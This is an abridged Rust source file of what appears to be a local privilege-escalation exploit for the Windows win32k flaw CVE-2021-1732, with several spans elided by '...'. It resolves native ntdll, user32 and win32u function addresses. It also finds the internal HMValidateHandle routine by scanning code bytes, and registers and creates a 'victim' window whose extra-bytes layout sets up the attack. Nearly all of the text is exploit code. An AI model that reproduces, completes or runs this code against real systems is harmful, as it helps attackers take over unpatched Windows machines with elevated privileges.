...
fn main() {
    ...
    *gaddr = victim1addr as usize;
    ...
    let tebptr = cve_2021_1732::get_teb();
...
unsafe fn init_ntfunctions() {
    ...
    let hnduser32 = LoadLibraryA(u32str.as_ptr() as *const i8);
    let hndntdll = GetModuleHandleA(ntdllstr.as_ptr() as *const i8);
    let hndwin32u = GetModuleHandleA(w32ustr.as_ptr() as *const i8);
    ...
    *pntcallbackreturn = GetProcAddress(
        hndntdll, ntcallbackstr.as_ptr() as *const i8).unwrap() as usize;
    *pntconsolecontrol = GetProcAddress(
        hndwin32u, ntconsolestr.as_ptr() as *const i8).unwrap() as usize;
    *psetwindowlongptr = GetProcAddress(
        hnduser32, setwlptstr.as_ptr() as *const i8).unwrap() as usize;
    *pgetntversionnums = GetProcAddress(
        hndntdll, getntverstr.as_ptr() as *const i8).unwrap() as usize;
    *pgetmenubarinfo = GetProcAddress(
        hnduser32, getmenubarinfstr.as_ptr() as *const i8).unwrap() as usize;
}
...
unsafe fn get_hmvalidatehandle_addr() {
    ...
    let hnduser32 = GetModuleHandleA(u32str.as_ptr() as *const i8);
    ...
    let getmenuaddr : isize = GetProcAddress(
        hnduser32, getmenustr.as_ptr() as *const i8).unwrap() as isize;
    for i in 0..0x100 {
    ...
    let calloffs: isize = (getmenuaddr - hnduser32) + calladdr as isize;
    //skip over padding
    let hmvhaddr: isize = hnduser32 + calloffs + 0x16;
...
unsafe fn register_window_class_1() {
    let instance1 = HINSTANCE(GetModuleHandleA(std::ptr::null()));
    let class1name = b"victimWnd\0";
    let mut class1 = WNDCLASSEXA::default();
    class1.h_instance = instance1;
    class1.lpsz_class_name = class1name.as_ptr() as *mut u8 as *mut i8;
    class1.lpfn_wnd_proc = Some(wndproc);
    class1.cb_wnd_extra = 0x70;
    class1.cb_cls_extra = 0;
    class1.cb_size = 0x50;
    class1.style = 3;
...
unsafe fn create_window_0() -> HWND {
    ...
    let hwnd1 = CreateWindowExA(
        0, 
        class1name.as_ptr() as *const i8, 
        wnd1title.as_ptr() as *const i8,
        0,
        CW_USEDEFAULT,
        CW_USEDEFAULT,
        CW_USEDEFAULT,
